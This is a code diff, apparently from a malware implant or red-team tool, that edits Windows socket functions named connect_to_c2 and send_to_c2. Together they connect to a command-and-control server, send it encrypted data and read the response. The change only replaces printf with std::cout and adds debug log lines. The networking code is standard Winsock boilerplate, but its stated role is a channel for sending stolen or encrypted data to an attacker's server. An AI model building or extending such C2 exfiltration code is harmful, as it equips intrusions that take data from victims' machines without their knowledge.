@@ -28,10 +28,11 @@ SOCKET connect_to_c2(const char *hostname, const char *port){
 	WSADATA wsaData;
 
 	/* Initialize WSA */
+	std::cout << " --- Initializing WSA" << std::endl; 
 	int iResult;
 	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
 	if(iResult != 0){
-		printf("WSA Startup failed: %d\n", iResult);
+		std::cout << "WSA Startup failed: " << iResult << std::endl;
 		return 1;
 	}
 
@@ -41,15 +42,16 @@ SOCKET connect_to_c2(const char *hostname, const char *port){
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
+	std::cout << " --- Initializing Socket" << std::endl;
 
 	/* Resolve Server Address & Port */
 	iResult = getaddrinfo(hostname, port, &hints, &result);
 	if(iResult != 0){
-		printf("getaddrinfo failed: %d\n", iResult);
+		std::cout << "getaddrinfo failed: " << iResult << std::endl; 
 		WSACleanup();
 		return 1;
 	}
-
+	std::cout << " --- Resolving Server Address & Port" << std::endl;
 	/* Create Socket Object */
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	ptr = result;
@@ -57,7 +59,7 @@ SOCKET connect_to_c2(const char *hostname, const char *port){
 	/* Socket Error Check */
 	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 	if(ConnectSocket == INVALID_SOCKET){
-		printf("Error at socket9): %;d\n", WSAGetLastError());
+		std::cout << "Error at socket9 : " << WSAGetLastError() << std::endl;
 		freeaddrinfo(result);
 		WSACleanup();
 		return 1;
@@ -69,11 +71,12 @@ SOCKET connect_to_c2(const char *hostname, const char *port){
 		closesocket(ConnectSocket);
 		ConnectSocket = INVALID_SOCKET;
 	}
+	std::cout << " --- Connecting to Socket " << std::endl;
 
 	/* Connection Error Check */
 	freeaddrinfo(result);
 	if(ConnectSocket == INVALID_SOCKET){
-		printf("Unable to connect to server!\n: ");
+		std::cout << "Unable to connect to server! " << std::endl;
 		WSACleanup();
 		return 1;
 	}
@@ -90,33 +93,41 @@ int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
 	char recvbuf[DEFAULT_BUFLEN];
 	int iResult;
 
+	std::cout << " --- Sending to Socket " << std::endl;
+
 	iResult = send(ConnectSocket, encrypted_data, (int) strlen(encrypted_data), 0);
 	if(iResult == SOCKET_ERROR){
-		printf("send failed: %d\n", WSAGetLastError());
+		std::cout << "send failed: " << WSAGetLastError() << std::endl;
 		closesocket(ConnectSocket);
 		WSACleanup();
 		return 1;
 	}
 
 	iResult = shutdown(ConnectSocket, SD_SEND);
+
+	std::cout << " --- Close Socket " << std::endl;
 	
 	/* Disconnect from C2 */
 	if(iResult == SOCKET_ERROR){
-		printf("shutdown failed: %d\n", WSAGetLastError());
+		std::cout << "shutdown failed: " << WSAGetLastError() << std::endl;
 		closesocket(ConnectSocket);
 		WSACleanup();
 		return 1;
 	}
 
+	std::cout << " --- Disconnecting from C2" << std::endl;
+
 	/* Receive Data */
+	std::cout << " --- Receiving Data" << std::endl;
 	do {
 		iResult = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);
 		if(iResult > 0){
-			printf("Bytes received: %d\n", iResult);
-		}else if(iResult == 0)
-			printf("Connection closed\n");
+			std::cout << "Bytes received: " << iResult <<std::endl;
+		}
+		else if (iResult == 0)
+			std::cout << "Connection closed " << std::endl;
 		else
-			printf("recv failed: %d\n", WSAGetLastError());
+			std::cout << "recv failed: " << WSAGetLastError() << std::endl;
 	} while(iResult > 0);
 
 	return 0;
